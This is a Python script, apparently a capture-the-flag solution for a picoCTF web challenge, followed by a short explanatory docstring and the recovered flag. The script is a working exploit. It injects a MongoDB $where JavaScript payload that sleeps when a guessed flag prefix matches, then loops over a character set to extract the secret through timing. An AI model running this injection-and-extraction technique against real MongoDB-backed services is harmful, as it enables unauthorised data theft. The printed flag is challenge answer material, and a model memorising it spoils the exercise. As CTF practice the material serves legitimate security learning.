import requests
import string

headers = {
    "Content-Type": "application/json"
}

SLEEP_TIME = 50

def send_request(candidate):
    url = "http://shell2017.picoctf.com:8080/search"
    data = {
        "$where": "if (this.flag && this.flag.startsWith('%s')) {sleep(%d)}" % (candidate, SLEEP_TIME)
    }
    response = requests.post(url, json=data, headers=headers)
    return response.json()

flag = ""
CHARSET = string.ascii_letters + string.digits + "{}_"
while len(flag) < 31:
    found = False
    for char in CHARSET:
        candidate = flag + char
        response = send_request(candidate)
        if response["time"] > SLEEP_TIME:
            flag = flag + char
            found = True
            print flag
            break
    if not found:
        print "Could not find next character"

print flag

"""
The problem description and hints all suggest that the database uses mongo. We can inject our own queries into mongo
similar to SQL by sending a parameter called $where. Mongo also allows us to use JavaScript for the
$where queries, but we can't get the flag directly because the flag gets filtered out.

The server also tells us how long it took to perform the search, which leads us to believe that we need
to perform a timing attack. We can use the sleep() function to sleep for as long as we want.

Finally, we get the flag:
flag{I_only_eat_0rg4n1c_flages}
"""
